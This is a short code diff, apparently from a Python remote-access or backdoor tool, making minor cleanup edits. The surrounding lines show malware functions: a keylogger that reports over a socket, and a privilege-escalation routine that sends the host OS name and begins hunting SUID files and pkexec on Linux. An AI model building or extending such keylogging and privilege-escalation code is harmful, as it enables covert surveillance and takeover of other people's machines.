@@ -188,7 +188,6 @@ def stop_keylogger():
     try:
         print("Terminating keylogger and main program...")
         if keylogger_socket:
-            # socket_send(keylogger_socket, "TERMINATE")
             print('keylogger socket termination...')
             keylogger_socket.close()
         if keylogger_thread:
@@ -206,7 +205,7 @@ def privilege_escalator(command):
     read_stream_result =""
     reliable_send(os.name)
     print(os.name)
-    
+
     if os.name == 'posix':
         findpkexec = False
         suid_files = []
